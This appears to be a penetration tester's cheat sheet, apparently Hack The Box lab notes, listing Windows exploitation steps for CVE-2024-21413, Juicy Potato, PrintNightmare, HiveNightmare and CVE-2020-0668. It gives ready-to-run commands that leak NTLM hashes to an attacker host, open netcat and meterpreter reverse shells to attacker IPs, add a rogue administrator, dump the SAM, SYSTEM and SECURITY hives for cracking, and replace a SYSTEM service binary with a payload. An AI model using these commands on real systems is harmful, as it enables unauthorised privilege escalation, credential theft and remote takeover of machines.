## CVE-2024-21413
There is a fresh CVE that targets new versions on Outlook in 2024 which actually works as a NTML sniffer check here:
https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

### How to use basically 
1)Setup a listening Responder on your machine
2)Run the exploit
```
python CVE-2024-21413.py --server '<SMTP server>' --port <SMTP port> --username '<SMTP username>' --password '<SMTP password>' --sender '<sender email>' --recipient '<recipient email>' --url '\\ATTACKERIP\something' --subject '<email subject>'
```
3)Enjoy!


# Juicy Potato
This exploit is usefull if you have SeImpersonatePriviledge and you are running Server 2016 then you may want to use this exploit. 
For 2019 there are other exploits that does same job like ROguePotato, SharpPotatoEFS,PrintSooler etc
Reference: https://github.com/ohpe/juicy-potato
```
Upload the exe to the victim.
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe YOURIP PORT" -t *
```
This should invoke a rev-shell in the listening nc on your machine.
Newer alternative: https://github.com/BeichenDream/GodPotato

# CVE-2021-1675 - PrintNightmare LPE (PowerShell)
Reference: https://github.com/calebstewart/CVE-2021-1675
1)Check if Spoolsrv is running
```
ls \\localhost\pipe\spoolss
```
2)Set Bypass policy in PowerShell
```
Set-ExecutionPolicy Bypass -Scope Process
```
3)Exploit time
```
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
4)Config new user (Should be part of Administrators)
```
net user hacker
```

# CVE-2021–36934 aka HiveNightmare
The permissions on key registry hives are set to allow all non-admin users to read the files by default, in most Windows 10 configurations. 
Reference: https://github.com/GossiTheDog/HiveNightmare
```
1)Upload the HiveNightmare.exe to the victim and run it
2)It should dump all the HIVE registries(SAM, SYSTEM & SECURITY) via Shadow copies to temp 
3)Transfer to your machine and decrypt with secrets dump
```

# CVE-2020-0668 aka Windows Kernel Elevation of Privilege Vulnerability
Reference: https://github.com/RedCursorSecurityConsulting/CVE-2020-0668
https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/
1)Compile and upload the exploit on the victim machine
2)Find a Atttackable service (The mozilla usually runs as SYSTEM and it's executable by lowpriv users)
```
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
3)Check Read+Exec permissions
```
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"´
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

```
4)Generate and upload a payload to the victim
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```
5)Do 2 copies of the revshell to Mozilla folder(2 because then we can revert later)
```
copy /Y C:\Users\htb-student\Desktop\maintenanceservice.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
6)Run the Exploit (with the source and destination file)
```
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       
[+] Moving C:\Users\htb-student\Desktop\maintenanceservice.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
[+] Mounting \RPC Control onto C:\Users\htb-student\AppData\Local\Temp\nzrghuxz.leo
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:\Users\htb-student\AppData\Local\Temp\179739c5-5060-4088-a3e7-57c7e83a0828.pbk
[+] Cleaning up
[+] Done!
```
7)The step 6 add the Full Access permission to the revshell in Mozilla via Links
8)Double check
```
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(F)
                                                                          BUILTIN\Administrators:(F)
                                                                          WINLPE-WS02\htb-student:(F)
																		  
```
9)Replace the payload again in Mozilla folder(the reason is that Exploit ruins the validity of the binary)
```
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

```
10)Setup NC listener and start the service to invoke RCE!